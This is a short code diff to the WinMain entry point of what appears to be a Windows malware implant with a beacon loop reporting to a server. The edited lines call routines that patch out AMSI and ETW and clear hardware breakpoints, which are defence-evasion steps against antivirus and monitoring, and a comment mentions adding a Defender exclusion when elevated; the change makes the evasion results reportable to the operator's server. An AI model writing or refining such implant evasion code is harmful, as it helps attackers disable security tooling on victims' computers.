@@ -16,10 +16,12 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         return 1;
     }
 
-    // Apply initial evasion
-    PatchAMSI();
-    PatchETW();
-    ClearHardwareBreakpoints();
+    // Apply initial evasion — capture return values; BeaconLoop reads them
+    // into session.amsiPatched / etwPatched / hwbpsCleared so the server
+    // gets accurate capability state instead of hardcoded TRUE.
+    BOOL amsiOk  = PatchAMSI();
+    BOOL etwOk   = PatchETW();
+    BOOL hwbpsOk = ClearHardwareBreakpoints();
 
     // Optional: add Defender exclusion if elevated
     wchar_t exePath[MAX_PATH];
